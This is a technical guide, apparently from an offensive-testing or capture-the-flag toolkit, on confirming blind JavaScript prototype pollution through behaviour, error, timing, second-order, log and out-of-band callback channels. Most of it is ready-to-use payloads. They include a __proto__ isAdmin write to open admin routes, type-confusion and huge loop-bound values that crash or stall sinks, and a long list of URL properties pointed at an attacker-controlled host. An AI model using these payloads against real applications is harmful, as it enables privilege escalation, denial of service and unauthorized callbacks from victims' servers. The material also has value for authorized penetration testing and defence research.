# Blind pollution — confirming the write when nothing echoes back

The worst case in the class: the merge accepts the write but no
endpoint reflects the polluted object. The confirmation moves from
body-readback to behaviour, timing, and error surfaces.

---

## 1. The three blind-oracle channels

| Channel | The signal | Cheapness |
|---|---|---|
| behaviour | a gate opens, a feature appears, a render changes | cheapest — one request |
| error | a 500-vs-200 split, an error message's wording | one request |
| timing | a sink that sleeps/loops on your property | 20+ samples |

## 2. The behaviour oracle — pollute the gate directly

Skip the marker entirely: when the write IS the gate property, the
gate's change is the readback.

```bash
# the readback is the gate itself
POST /api/settings {"__proto__":{"isAdmin":true}}
GET /admin        → 200 (was 403) — the fallback read it
```

No marker needed when you can reach a property a check already reads.
The gate opening IS the confirm — stronger than a marker because it
proves the sink AND the write in one step. The marker protocol is
for when no gate property is known yet.

## 3. The error oracle

Pollute a property a sink expects as a specific type:

```json
{"__proto__": {"timeout": "not-a-number"}}     — a sink awaiting int
{"__proto__": {"outputFunctionName": 12345}}   — EJS name must be string
{"__proto__": {"filters": "x"}}                 — must be an object
{"__proto__": {"helpers": 42}}
{"__proto__": {"split": "not-a-fn"}}            — a method lookup
```

The 500-vs-200 split, or the error's wording ("X is not a function"
vs "X must be a string"), tells you the property was READ — pollution
confirmed even though the response is an error. Fix the type and the
real value lands.

## 4. The timing oracle

```json
{"__proto__": {"timeout": 30000}}
{"__proto__": {"delay": 5000}}
{"__proto__": {"sleep": 5}}
{"__proto__": {"retries": 100}}
{"__proto__": {"maxIterations": 1000000}}
{"__proto__": {"depth": 1000}}
{"__proto__": {"limit": 999999}}
```

Any property a sink converts to a wait — a fetch timeout, a retry
count, a loop bound, a sleep duration. Measure ~20 samples of the
baseline route vs the polluted one; the delta has to clear jitter.
The fields to try are the option names the app's own code uses —
`bundle_miner.py` names them.

## 5. The second-order channel

Pollution that only materializes on a LATER code path:

- a `config` doc saved now, merged on next server-side render.
- a template option object, rendered on the next `/view` request.
- a stored settings object, loaded on the next login.
- a cron/worker job reading `job.options` polluted at enqueue.

The write's response is silent; the observation happens on the
trigger request — `/render`, `/export`, `/report`, `/preview`,
`/` (any rendered page), a ws connect, a job-run.

## 6. The DNS/HTTP callback

Pollute a URL-bearing property the app later dereferences:

```json
{"__proto__": {"callbackUrl": "http://<yours>/"}}
{"__proto__": {"webhook": "http://<yours>/"}}
{"__proto__": {"notifyUrl": "http://<yours>/"}}
{"__proto__": {"importUrl": "http://<yours>/"}}
{"__proto__": {"avatar": "http://<yours>/a.png"}}
{"__proto__": {"image": "http://<yours>/i.png"}}
{"__proto__": {"icon": "http://<yours>/i.png"}}
{"__proto__": {"fetch": "http://<yours>/"}}
{"__proto__": {"src": "http://<yours>/"}}
{"__proto__": {"href": "http://<yours>/"}}
{"__proto__": {"baseURL": "http://<yours>/"}}
{"__proto__": {"proxy": "http://<yours>:8080"}}
{"__proto__": {"agent": {"proxy":"http://<yours>"}}}
{"__proto__": {"logger": {"transport": {"host":"<yours>"}}}}
```

`tools/web/oob_listener.py` records the hit — a request arriving is
the pollution's readback.

## 7. The log-channel oracle

`{"__proto__": {"level": "silly"}}` / `{"debug": true}` / `{"verbose":
true}` — flip the logging level; the next response may include a
debug field, a stack, or a log entry in an admin-visible feed. On a
CTF with readable logs, the log IS the readback.

## 8. The "write two, differ one" control

For any blind channel, the control pair:

```
pollute {"__proto__":{"x":"A"}} → observe S1
pollute {"__proto__":{"x":"B"}} → observe S2
```

S1 ≠ S2 → the property is being read (pollution lands).
S1 == S2 → either no write, or no sink — split by trying a KNOWN
gate property (`isAdmin`) on the second write.

## 9. What a real blind-negative looks like

- marker absent on every readable surface
- no gate changes
- no error delta
- timing stable across 20 samples
- no OOB hit on a dereference property

All channels empty across three carriers = `refutes` on THIS merge
site. The write either doesn't reach a merge or the merge is safe.
Record and move to the next merge site or class.
